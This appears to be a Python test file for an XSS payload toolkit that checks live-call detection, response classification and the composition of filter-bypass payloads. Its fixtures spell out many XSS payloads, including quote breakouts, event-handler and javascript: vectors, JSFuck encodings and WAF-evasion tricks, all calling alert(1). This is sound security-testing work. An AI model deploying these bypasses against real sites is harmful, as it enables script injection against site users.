#!/usr/bin/env python3
"""
test_js_verify.py — fixture tests for the XSS grammar, obfuscators, JSFuck
compiler, junction bypasses, and DOM/JS verification flowchart branches.

Run:  python3 test_js_verify.py   (or pytest)
"""
from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from check_reflection import (  # noqa: E402
    compute_js_breakout,
    inspect_reflection_point,
    parse_meta,
)
from core.jsfuck import jsfuck_encode  # noqa: E402
import js_verify  # noqa: E402
from recommend_payload import (  # noqa: E402
    _core_payload,
    _parse_response,
    avail_funcs,
    bracket_funcs,
    classify_response,
    compose,
    encoded_funcs,
    indirect_call_funcs,
    jsfuck_funcs,
    noparens_funcs,
    u6_funcs,
    u_funcs,
)

M = "vvmabc"  # deterministic marker for fixtures


def classified(
    status: int, body: str, payload: str, headers: dict[str, str] | None = None
) -> dict[str, str]:
    return classify_response(status, headers or {}, body, payload, M)


def run() -> bool:
    t: list[tuple[str, bool, str]] = []

    # --- js_verify: live-call detection inside script bodies -------------
    js_Basic = jsfuck_encode("alert(1)", eval_source=True, compact=False)
    js_stripped = js_Basic[:-2]  # remove trailing () invocation
    cases = [
        # (script_text, needle, expected_live, label)
        (
            'var q=""-alert(1)-"<!--vvmabc-->";',
            '"-alert(1)-"<!--vvmabc-->',
            True,
            "intact breakout + call",
        ),
        (
            'var q=""-(1)-"<!--vvmabc-->";',
            '"-self[\'a\'+\'lert\'](1)-"<!--vvmabc-->',
            False,
            "name stripped -> -(1)- dead  (the xss4 bug)",
        ),
        (
            'var q="\\"-alert(1)-\\"<!--vvmabc-->";',
            '"-alert(1)-"<!--vvmabc-->',
            False,
            "quote-escaped -> string-trapped",
        ),
        (
            'var q="x"; /* "-alert(1)-"<!--vvmabc--> */',
            '"-alert(1)-"<!--vvmabc-->',
            False,
            "comment-trapped",
        ),
        (
            'var q=`user: "-alert(1)-"<!--vvmabc-->`;',
            '"-alert(1)-"<!--vvmabc-->',
            False,
            "template-literal trapped",
        ),
        (
            'var q=`-alert(1)-";var r="${x}";',
            '"-alert(1)-"<!--vvmabc-->',
            False,
            "needle absent entirely",
        ),
        (
            'var q=""-self[\'a\'+\'lert\'](1)-"<!--vvmabc-->";',
            '"-self[\'a\'+\'lert\'](1)-"<!--vvmabc-->',
            True,
            "bracket call lives",
        ),
        (
            'var q=""-window["c"+"onfirm"](1)-"<!--vvmabc-->";',
            '"-window["c"+"onfirm"](1)-"<!--vvmabc-->',
            True,
            "dquote bracket",
        ),
        (
            'var q=""-self["\\x61"+"lert"](1)-"<!--vvmabc-->";',
            '"-self["\\x61"+"lert"](1)-"<!--vvmabc-->',
            True,
            "hex escape concat",
        ),
        (
            'var q=""-al\\u{65}rt(1)-"<!--vvmabc-->";',
            '"-al\\u{65}rt(1)-"<!--vvmabc-->',
            True,
            "ES6 unicode ident-call",
        ),
        (
            'var q=""-onerror=alert;throw 1-"<!--vvmabc-->";',
            '"-onerror=alert;throw 1-"<!--vvmabc-->',
            True,
            "assign+throw idiom",
        ),
        (
            'var q=""-onerror=alert;-"<!--vvmabc-->";',
            '"-onerror=alert;throw 1-"<!--vvmabc-->',
            False,
            "assign but throw stripped -> orphan",
        ),
        (
            'var q=""-;throw 1-"<!--vvmabc-->";',
            '"-onerror=alert;throw 1-"<!--vvmabc-->',
            False,
            "throw but assign stripped -> orphan",
        ),
        (
            'self.onerror=throw-1/*vvmabc*/',
            'self.onerror=conalertfirm;throw-1/*vvmabc*/',
            False,
            "fn name + semicolon stripped -> self.onerror=throw-1 is SyntaxError (xss2 bug)",
        ),
        (
            'var q=""-alert(1)-"; var z="markerless";',
            '"-alert(1)-"',
            True,
            "core fallback: marked needle absent, core needle hits",
        ),
        # Indirect call & junction bypass verification in js_verify
        (
            'var q=""-alert?.(1)-"<!--vvmabc-->";',
            '"-alert?.(1)-"<!--vvmabc-->',
            True,
            "optional-chaining call alert?.(1) lives",
        ),
        (
            'var q=""-(alert)(1)-"<!--vvmabc-->";',
            '"-(alert)(1)-"<!--vvmabc-->',
            True,
            "parenthesized callee (alert)(1) lives",
        ),
        (
            'var q=""-()(1)-"<!--vvmabc-->";',
            '"-(alert)(1)-"<!--vvmabc-->',
            False,
            "stripped parenthesized callee ()(1) -> dead",
        ),
        (
            'var q=""-(0,alert)(1)-"<!--vvmabc-->";',
            '"-(0,alert)(1)-"<!--vvmabc-->',
            True,
            "comma-operator indirect call (0,alert)(1) lives",
        ),
        (
            'var q=""-(0,)(1)-"<!--vvmabc-->";',
            '"-(0,alert)(1)-"<!--vvmabc-->',
            False,
            "stripped comma callee (0,)(1) -> dead",
        ),
        (
            'var q=""-[1].find(alert)-"<!--vvmabc-->";',
            '"-[1].find(alert)-"<!--vvmabc-->',
            True,
            "higher-order callback [1].find(alert) lives",
        ),
        (
            'var q=""-[1].find()-"<!--vvmabc-->";',
            '"-[1].find(alert)-"<!--vvmabc-->',
            False,
            "stripped callback [1].find() -> dead",
        ),
        (
            'var q=""-alert/**/(1)-"<!--vvmabc-->";',
            '"-alert/**/(1)-"<!--vvmabc-->',
            True,
            "comment-separated call alert/**/(1) lives",
        ),
        (
            f'var q=""-{js_Basic}-"<!--vvmabc-->";',
            f'"-{js_Basic}-"<!--vvmabc-->',
            True,
            "dynamic JSFuck [][...][...](...)() call lives",
        ),
        (
            f'var q=""-{js_stripped}-"<!--vvmabc-->";',
            f'"-{js_Basic}-"<!--vvmabc-->',
            False,
            "JSFuck with trailing call parens stripped -> dead",
        ),
        # Quoteless bracket & semicolon-free noparens verification
        (
            'var q=""-self[/al/.source+/ert/.source](1)-"<!--vvmabc-->";',
            '"-self[/al/.source+/ert/.source](1)-"<!--vvmabc-->',
            True,
            "quoteless RegExp .source bracket call lives",
        ),
        (
            'var q=""-self[8680439..toString(30)](1)-"<!--vvmabc-->";',
            '"-self[8680439..toString(30)](1)-"<!--vvmabc-->',
            True,
            "quoteless base-30 toString bracket call lives",
        ),
        (
            'var q="";{onerror=alert}throw 1;/*vvmabc*/',
            '";{onerror=alert}throw 1;/*vvmabc*/',
            True,
            "no-parens no-semicolon {onerror=alert}throw 1 lives",
        ),
        (
            'var q="";throw onerror=alert,1;/*vvmabc*/',
            '";throw onerror=alert,1;/*vvmabc*/',
            True,
            "no-parens no-semicolon throw onerror=alert,1 lives",
        ),
        (
            "var q=\"\";location='javascript:alert\\x281\\x29';/*vvmabc*/",
            "\";location='javascript:alert\\x281\\x29';/*vvmabc*/",
            True,
            "no-parens location='javascript:alert\\x281\\x29' sink lives",
        ),
    ]
    for script, needle, want, label in cases:
        got, ev = js_verify.payload_live_in_js(script, needle, "vvmabc")
        t.append((label, got == want, f"want={want} got={got} | {ev}"))

    # --- lexer sanity on tricky shapes -----------------------------------
    sp = js_verify.lex_js('var re=/\\"/; var q=""-alert(1)-"";')
    t.append(
        (
            "regex literal not a call",
            len(sp["calls"]) == 1 and len(sp["strings"]) == 2,
            str(sp),
        )
    )
    sp = js_verify.lex_js("x = a/b + c/d; y=`${alert(1)}`;")
    t.append(
        (
            "template ${} interior is code",
            bool(sp["calls"]),
            str(sp["calls"]),
        )
    )

    # --- classify_response: full flowchart branches ----------------------
    fcases = [
        (
            200,
            {},
            '<script>var q=""-alert(1)-"<!--vvmabc-->";</script>',
            '"-alert(1)-"',
            "V",
            "marker + script + live call",
        ),
        (
            200,
            {},
            '<script>var q=""-(1)-"<!--vvmabc-->";</script>',
            '"-self[\'a\'+\'lert\'](1)-"',
            "R",
            "call stripped -> R (xss4)",
        ),
        (200, {}, "<p>nothing</p>", '"-alert(1)-"', "none", "nothing reflected"),
        (
            403,
            {},
            "<html>Forbidden</html>",
            '"-alert(1)-"',
            "blocked",
            "WAF 403",
        ),
        (
            200,
            {},
            '<script>var q=""-alert(1)-"";</script>',
            '"-alert(1)-"',
            "V",
            "marker stripped, core intact -> V",
        ),
        (
            200,
            {},
            '<script>var q="\\"-alert(1)-\\"";</script>',
            '"-alert(1)-"',
            "none",
            "escaped -> core absent verbatim",
        ),
        (
            200,
            {},
            "<img src=x vvmabc onerror=alert(1)>",
            "<img src=x vvm{id} onerror=alert(1)>",
            "V",
            "attr handler + call",
        ),
        (
            200,
            {},
            '<img src=x vvmabc onerror="(1)">',
            "<img src=x vvm{id} onerror=alert(1)>",
            "R",
            "handler call stripped",
        ),
        (
            200,
            {},
            '<a href="javascript:alert(1)" vvmabc>x</a>',
            "<a vvm{id} href=javascript:alert(1)>",
            "V",
            "js: url + call",
        ),
        (
            200,
            {},
            '<a href="javascript:" vvmabc>x</a>',
            "<a vvm{id} href=javascript:alert(1)>",
            "R",
            "js: url call stripped",
        ),
        (
            200,
            {"content-security-policy": "script-src 'self'"},
            '<script>var q=""-alert(1)-"<!--vvmabc-->";</script>',
            '"-alert(1)-"',
            "V",
            "CSP note appended",
        ),
        (
            200,
            {},
            '<title>"-alert(1)-"<!--vvmabc--></title>',
            '"-alert(1)-"',
            "R",
            "marker in inert title -> R",
        ),
        # B3: rawtext / inert container guards
        (
            200,
            {},
            "<textarea><img src=x vvmabc onerror=alert(1)></textarea>",
            "<img src=x vvm{id} onerror=alert(1)>",
            "R",
            "B3: unclosed textarea traps img onerror -> R",
        ),
        (
            200,
            {},
            "<template><script vvmabc>alert(1)</script></template>",
            "<script vvm{id}>alert(1)</script>",
            "R",
            "B3: template traps script -> R",
        ),
        (
            200,
            {},
            '<script type="application/json">"-alert(1)-"<!--vvmabc--></script>',
            '"-alert(1)-"',
            "R",
            "B3: application/json script block is non-executable -> R",
        ),
        (
            200,
            {},
            "<textarea></textarea><img src=x vvmabc onerror=alert(1)>",
            "</textarea><img src=x vvm{id} onerror=alert(1)>",
            "V",
            "B3: closing </textarea> before img onerror -> V",
        ),
        # A2: escaped-quote breakout (addslashes turns \" into \\")
        (
            200,
            {},
            '<script>var q="\\\\"-alert(1)-\\\\"<!--vvmabc-->";</script>',
            '\\"-alert(1)-\\"',
            "V",
            'A2: escaped-quote breakout \\" -> \\\\" frees quote -> V',
        ),
        # B4: DOM & navigation assignment sinks without throw
        (
            200,
            {},
            '<script>var q="";el.innerHTML=x;/*vvmabc*/</script>',
            '";el.innerHTML=x;/*vvm{id}*/',
            "V",
            "B4: innerHTML assignment sink without throw -> V",
        ),
        (
            200,
            {},
            '<script>var q="";location="javascript:alert(1)";/*vvmabc*/</script>',
            '";location="javascript:alert(1)";/*vvm{id}*/',
            "V",
            "B4: location=javascript: assignment sink -> V",
        ),
        (
            200,
            {},
            '<script>var q="";location="/safe";/*vvmabc*/</script>',
            '";location="/safe";/*vvm{id}*/',
            "R",
            'B4: benign location="/safe" is NOT a sink -> R',
        ),
        (
            200,
            {},
            '<input value="" autofocus onfocus="onerror=alert;throw 1/*vvmabc*/">',
            '" autofocus onfocus="onerror=alert;throw 1',
            "R",
            "bare onerror= in <input onfocus> is shadowed by element.onerror -> R",
        ),
        (
            200,
            {},
            '<input value="" autofocus onfocus="self.onerror=alert;throw 1/*vvmabc*/">',
            '" autofocus onfocus="self.onerror=alert;throw 1',
            "V",
            "self.onerror= in <input onfocus> binds window.onerror -> V",
        ),
        # Letter-stripper verification: marker letters stripped from /*vvmabc*/ -> /**/,
        # while non-alphabetic JSFuck core survives intact inside <script>
        (
            200,
            {},
            f"<script>{js_Basic}/**/</script>",
            f"{js_Basic}/*vvm{{id}}*/",
            "V",
            "letter-stripper strips vvmabc to /**/ while JSFuck core survives -> V",
        ),
    ]
    for status, hdrs, body, payload, want, label in fcases:
        got = classified(status, body, payload, hdrs)
        conf = got["confidence"]
        t.append((label, conf == want, f"want={want} got={conf} | {got['evidence']}"))

    # --- B1 & B2: context, per-reflection quote, and JS structural closer -
    ctxs, q, _brk = inspect_reflection_point(
        '<input type="text" placeholder="testing1abc">', "testing1abc"
    )
    t.append(
        (
            "B1: placeholder attr detected as attr with dquote",
            ctxs == ["attribute value (quotes NOT encoded)"] and q == '"',
            f"ctxs={ctxs} q={q!r}",
        )
    )
    ctxs2, q2, _ = inspect_reflection_point(
        "<div data-search='testing1abc'></div>", "testing1abc"
    )
    t.append(
        (
            "B1: data-* attr detected with squote",
            ctxs2 == ["attribute value (quotes NOT encoded)"] and q2 == "'",
            f"ctxs={ctxs2} q={q2!r}",
        )
    )
    ctxs3, q3, _ = inspect_reflection_point(
        "<input value=testing1abc>", "testing1abc"
    )
    t.append(
        (
            "B1: unquoted attr detected with empty quote",
            ctxs3 == ["attribute value (quotes NOT encoded)"] and q3 == "",
            f"ctxs={ctxs3} q={q3!r}",
        )
    )
    jctx, jq, jcloser = compute_js_breakout('function f() { var cfg = { a: ["')
    t.append(
        (
            "B2: compute_js_breakout nested closer",
            jctx == "javascript string" and jq == '"' and jcloser == '"]}}',
            f"jctx={jctx} jq={jq!r} jcloser={jcloser!r}",
        )
    )

    # --- A2, A4, A5, B2: compose() synthesis checks -----------------------
    sc_no_angle = {"'": 100, '"': 100, "<": 0, ">": 0, "/": 100, "\\": 100}
    c_b2 = compose("js_string", '"', sc_no_angle, js_breakout='"]}}')
    t.append(
        (
            "B2: compose emits structural closer candidate",
            any('"]}};alert(1)' in c["payload"] for c in c_b2),
            str([c["payload"] for c in c_b2]),
        )
    )
    sc_esc_q = {"'": 100, '"': 50, "<": 0, ">": 0, "/": 100, "\\": 50}
    c_a2 = compose(
        "js_string", '"', sc_esc_q, escaped_q={'"'}, js_breakout='"]}'
    )
    t.append(
        (
            "A2+B2: compose emits escaped-quote & structural closer",
            any(c["payload"].startswith('\\"') for c in c_a2)
            and any('\\"]};alert(1)' in c["payload"] for c in c_a2),
            str([c["payload"] for c in c_a2]),
        )
    )
    c_a4 = compose("attr", '"', sc_no_angle, kw={"space": False})
    t.append(
        (
            "A4: compose emits slash-separated attr injection when space dead",
            any('"/autofocus/onfocus="' in c["payload"] for c in c_a4),
            str([c["payload"] for c in c_a4]),
        )
    )
    sc_no_gt = {"'": 100, '"': 100, "<": 100, ">": 0, "/": 100, "\\": 100}
    c_a4_gt = compose(
        "html",
        "",
        sc_no_gt,
        kw={
            "space": False,
            "svg_tag": False,
            "onload": True,
            "pair_svg_onload": False,
            "call_alert": False,
        },
        kwv={"svg_tag": ("<svg>", "<svg")},
        fn_cap=8,
    )
    t.append(
        (
            "A4+gt_missing: slash-separated <svg/.../onload=...// when '>' and ' ' dead",
            any(
                c["payload"].startswith("<svg/vvm{id}/onload=")
                and c["payload"].endswith("//")
                for c in c_a4_gt
            ),
            str([c["payload"] for c in c_a4_gt[:6]]),
        )
    )
    c_a5 = compose(
        "html",
        "",
        sc_no_angle,
        kwv={"fullwidth_lt": ("\uff1c", "<"), "double_url_lt": ("%3c", "<")},
    )
    t.append(
        (
            "A5: compose emits double-url and fullwidth angle bypasses",
            any(c["payload"].startswith("%3c") for c in c_a5)
            and any(c["payload"].startswith("\uff1c") for c in c_a5),
            str([c["payload"] for c in c_a5]),
        )
    )

    # --- Blocked-alert & call-mode symmetry across all fn builders --------
    kw_no_calls_no_names = {
        "parentheses": False,
        "backtick": False,
        "gen_call": False,
        "gen_tick": False,
        "alert": False,
        "confirm": False,
        "prompt": False,
        "print": False,
        "char_ref": True,
        "gen_u6brace": True,
        "gen_bracket": True,
    }
    bf_throw = bracket_funcs(kw_no_calls_no_names)
    t.append(
        (
            "bracket_funcs throw-mode covers all splits incl self['con'+'firm']",
            "onerror=self['con'+'firm'];throw 1" in bf_throw
            and "onerror=self['pr'+'ompt'];throw 1" in bf_throw
            and "onerror=self['pr'+'int'];throw 1" in bf_throw,
            str(bf_throw[:12]),
        )
    )
    ef_throw = encoded_funcs(kw_no_calls_no_names)
    uf_throw = u_funcs(kw_no_calls_no_names)
    u6_throw = u6_funcs(kw_no_calls_no_names)
    t.append(
        (
            "encoded/u/u6_funcs throw-mode covers all 4 dialog fns",
            len(ef_throw) >= 4
            and len(uf_throw) == 8
            and len(u6_throw) == 8
            and all(
                x.startswith("onerror=")
                and (x.endswith(";throw 1") or x.endswith(";throw-1"))
                for x in uf_throw + u6_throw
            ),
            f"ef={len(ef_throw)} uf={uf_throw} u6={u6_throw}",
        )
    )
    af_confirm = avail_funcs(
        {
            "parentheses": False,
            "backtick": False,
            "gen_call": False,
            "gen_tick": False,
            "alert": False,
            "confirm": True,
            "prompt": False,
            "print": False,
        }
    )
    t.append(
        (
            "avail_funcs throw-mode falls back to surviving confirm",
            af_confirm
            == ["onerror=confirm;throw 1", "onerror=confirm;throw-1"],
            str(af_confirm),
        )
    )
    af_space_dead = avail_funcs(
        {
            "parentheses": False,
            "backtick": False,
            "gen_call": False,
            "gen_tick": False,
            "space": False,
            "alert": True,
            "confirm": False,
            "prompt": False,
            "print": False,
        }
    )
    t.append(
        (
            "avail_funcs throw-mode space-free ops when ' ' dead",
            af_space_dead
            == ["onerror=alert;throw-1", "onerror=alert;throw/1/"],
            str(af_space_dead),
        )
    )

    # --- Dynamic JSFuck synthesis & letter_stripper integration -----------
    jsf_str = jsfuck_encode("alert(1)", eval_source=False, compact=False)
    jsf_exec = jsfuck_encode("alert(1)", eval_source=True, compact=False)
    jsf_parent = jsfuck_encode(
        "alert(1)", eval_source=True, parent_scope=True, compact=False
    )
    jsf_compact = jsfuck_encode("alert(1)", eval_source=True, compact=True)
    t.append(
        (
            "jsfuck_encode pure 6-char alphabet constraint ([]()!+)",
            set(jsf_str) <= set("[]()!+")
            and set(jsf_exec) <= set("[]()!+")
            and set(jsf_parent) <= set("[]()!+")
            and len(jsf_str) < len(jsf_exec) < len(jsf_parent),
            f"lens={len(jsf_str)}/{len(jsf_exec)}/{len(jsf_parent)}",
        )
    )
    t.append(
        (
            "jsfuck_encode compact numeric mode is letter-free and shorter",
            not any(c.isalpha() for c in jsf_compact)
            and len(jsf_compact) < len(jsf_exec),
            f"compact={len(jsf_compact)} full={len(jsf_exec)}",
        )
    )
    sc_all = {"'": 100, '"': 100, "<": 100, ">": 100, "/": 100, "\\": 100}
    sc_no_q_no_bs = {"'": 0, '"': 0, "<": 100, ">": 100, "/": 100, "\\": 0}
    c_ls = compose("js_raw", "", sc_all, letter_stripper=True)
    t.append(
        (
            "compose letter_stripper=True emits non-alphabetic JSFuck candidates",
            len(c_ls) >= 2
            and all("jsfuck" in c["technique"].lower() for c in c_ls),
            str([c["technique"] for c in c_ls]),
        )
    )
    # When dialog names are blocked and () is allowed, JSFuck alert(1) must
    # precede `onerror=eval;throw 1` / `self.onerror=eval;throw 1`!
    kw_names_blocked_parens_ok = {
        "parentheses": True,
        "gen_call": False,
        "backtick": False,
        "gen_tick": False,
        "alert": False,
        "confirm": False,
        "prompt": False,
        "print": False,
        "char_ref": False,
        "gen_bracket": False,
    }
    c_jsf_before_eval = compose(
        "js_raw", "", sc_no_q_no_bs, kw=kw_names_blocked_parens_ok
    )
    t.append(
        (
            "compose prioritizes JSFuck alert(1) BEFORE onerror=eval;throw 1 when () is allowed",
            bool(c_jsf_before_eval)
            and "dynamic jsfuck" in c_jsf_before_eval[0]["technique"]
            and not c_jsf_before_eval[0]["payload"].startswith("onerror=eval"),
            str([c["technique"] for c in c_jsf_before_eval[:4]]),
        )
    )

    # --- Call-junction & tag/proto junction bypasses ----------------------
    # WAF allows `(` and `)` and `alert`, but blocks `alert(1)` (`call_*`)
    # AND blocks quotes `'`/`"` AND backslash `\`!
    sc_no_q_no_bs = {"'": 0, '"': 0, "<": 100, ">": 100, "/": 100, "\\": 0}
    kw_junction_blocked = {
        "parentheses": True,
        "gen_call": False,
        "alert": True,
        "confirm": False,
        "prompt": False,
        "print": False,
        "call_alert": False,
        "char_ref": False,
    }
    ind = indirect_call_funcs(kw_junction_blocked, slash_ok=True)
    t.append(
        (
            "indirect_call_funcs emits alert?.(1), (alert)(1), (0,alert)(1), alert/**/(1)",
            "alert?.(1)" in ind
            and "(alert)(1)" in ind
            and "(0,alert)(1)" in ind
            and "alert/**/(1)" in ind,
            str(ind),
        )
    )
    c_junc = compose("js_raw", "", sc_no_q_no_bs, kw=kw_junction_blocked)
    t.append(
        (
            "compose rescues blocked call_alert when quotes and backslash are also dead",
            any("alert?.(1)" in c["payload"] for c in c_junc)
            and any("(alert)(1)" in c["payload"] for c in c_junc),
            str([c["payload"] for c in c_junc]),
        )
    )
    # Tag-pair junction blocked (`svg_tag=True`, `onload=True`, `space=True`, `pair_svg_onload=False`)
    c_pair_junc = compose(
        "html",
        "",
        sc_all,
        kw={"svg_tag": True, "onload": True, "pair_svg_onload": False},
    )
    t.append(
        (
            "compose breaks blocked 'svg onload' pair with slash separator even when space passes",
            any(
                c["payload"].startswith("<svg/vvm{id}/onload=")
                for c in c_pair_junc
            ),
            str([c["payload"] for c in c_pair_junc]),
        )
    )
    # Protocol-href junction blocked (`javascript_proto=True`, `proto_href=False`)
    c_proto_junc = compose(
        "html",
        "",
        sc_all,
        kw={"javascript_proto": True, "proto_href": False},
    )
    t.append(
        (
            "compose breaks blocked 'href=javascript:' junction via space/case/entity",
            any('href=" javascript:' in c["payload"] for c in c_proto_junc)
            and any('href="JaVaScRiPt:' in c["payload"] for c in c_proto_junc),
            str([c["payload"] for c in c_proto_junc]),
        )
    )

    # --- Quoteless self[...] when ' or " (or both) are blocked ------------
    kw_names_blocked_bracket_ok = {
        "parentheses": True,
        "gen_call": True,
        "alert": False,
        "confirm": False,
        "prompt": False,
        "print": False,
        "char_ref": False,
        "gen_bracket": True,
    }
    bf_qblocked = bracket_funcs(
        kw_names_blocked_bracket_ok, scores=sc_no_q_no_bs
    )
    c_qblocked = compose(
        "js_raw", "", sc_no_q_no_bs, kw=kw_names_blocked_bracket_ok, fn_cap=6
    )
    t.append(
        (
            "quoteless self[/al/.source+/ert/.source](1) & self[8680439..toString(30)](1) emitted when quotes blocked",
            "self[/al/.source+/ert/.source](1)" in bf_qblocked
            and "self[8680439..toString(30)](1)" in bf_qblocked
            and any(
                "self[/al/.source+/ert/.source](1)" in c["payload"]
                for c in c_qblocked
            )
            and any(
                "self[8680439..toString(30)](1)" in c["payload"]
                for c in c_qblocked
            ),
            str([c["payload"] for c in c_qblocked]),
        )
    )

    # --- No-parentheses & no-semicolon + hex-paren location redirect ------
    kw_no_parens = {
        "parentheses": False,
        "gen_call": False,
        "backtick": False,
        "gen_tick": False,
        "alert": True,
        "confirm": False,
        "prompt": False,
        "print": False,
        "javascript_proto": True,
    }
    np_out = noparens_funcs(kw_no_parens)
    c_np_html = compose("html", "", sc_all, kw=kw_no_parens, fn_cap=8)
    t.append(
        (
            "noparens_funcs emits {onerror=alert}throw 1, throw onerror=alert,1, and location='javascript:alert\\x281\\x29'",
            "{onerror=alert}throw 1" in np_out
            and "throw onerror=alert,1" in np_out
            and "location='javascript:alert\\x281\\x29'" in np_out
            and any(
                "{self.onerror=alert}throw 1" in c["payload"]
                for c in c_np_html
            ),
            str(np_out),
        )
    )
    # xss2.php regression: semicolon=False, space=False, all dialog names stripped ->
    # _rebuild_name must emit {self.onerror=alalertert}throw-1 (no ';')
    sc_xss2 = {"'": 0, '"': 100, "<": 0, ">": 0, "/": 100, "\\": 50}
    kw_xss2 = {
        "parentheses": False,
        "gen_call": False,
        "backtick": False,
        "gen_tick": False,
        "alert": False,
        "confirm": False,
        "prompt": False,
        "print": False,
        "space": False,
        "semicolon": False,
        "char_ref": False,
        "gen_bracket": False,
        "gen_u6brace": False,
        "autofocus": True,
        "onfocus": True,
    }
    kwv_xss2 = {
        "alert": ("alert", ""),
        "confirm": ("confirm", ""),
    }
    c_xss2 = compose("attr", '"', sc_xss2, kw=kw_xss2, kwv=kwv_xss2)
    t.append(
        (
            "xss2.php: semicolon=False + stripped alert emits {self.onerror=alalertert}throw-1",
            bool(c_xss2)
            and c_xss2[0]["payload"]
            == '"/autofocus/onfocus="{self.onerror=alalertert}throw-1',
            str([c["payload"] for c in c_xss2]),
        )
    )
    kw_xss2_no_braces = dict(kw_xss2, braces=False)
    c_xss2_nb = compose(
        "attr", '"', sc_xss2, kw=kw_xss2_no_braces, kwv=kwv_xss2
    )
    t.append(
        (
            "xss2.php: semicolon=False + braces=False + space=False emits throw/**/self.onerror=alalertert,1 and throw-0,self.onerror=alalertert,1",
            len(c_xss2_nb) >= 2
            and c_xss2_nb[0]["payload"]
            == '"/autofocus/onfocus="throw/**/self.onerror=alalertert,1'
            and c_xss2_nb[1]["payload"]
            == '"/autofocus/onfocus="throw-0,self.onerror=alalertert,1',
            str([c["payload"] for c in c_xss2_nb]),
        )
    )

    # --- Multiline parse_meta & _parse_response / _core_payload -----------
    ml_meta = parse_meta(
        "<!-- generated_by: send_payloads.py -->\n"
        "<!-- input_sent: testing1aaaa00\nbbbb01testing2 -->\n"
        "<p>body</p>"
    )
    t.append(
        (
            "parse_meta preserves multiline input_sent containing newline item",
            ml_meta.get("input_sent") == "testing1aaaa00\nbbbb01testing2",
            repr(ml_meta),
        )
    )
    st, hd, bd = _parse_response(
        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<p>x</p>"
    )
    t.append(
        (
            "parse_response basic",
            st == 200
            and bd == "<p>x</p>"
            and hd.get("content-type") == "text/html",
            f"{st} {bd!r}",
        )
    )
    t.append(
        (
            "core_payload strips tail comment",
            _core_payload('"-alert(1)-"<!--vvmabc-->', "vvmabc")
            == '"-alert(1)-"',
            "",
        )
    )
    t.append(
        (
            "core_payload strips in-payload marker",
            _core_payload("<img src=x vvmabc onerror=alert(1)>", "vvmabc")
            == "<img src=x  onerror=alert(1)>",
            "",
        )
    )

    # --- report -----------------------------------------------------------
    bad = [r for r in t if not r[1]]
    for label, ok, det in t:
        print(
            ("PASS " if ok else "FAIL ")
            + label
            + ("  " + det if det and not ok else "")
        )
    print(f"\n{len(t) - len(bad)}/{len(t)} passed")
    return not bad


if __name__ == "__main__":
    sys.exit(0 if run() else 1)
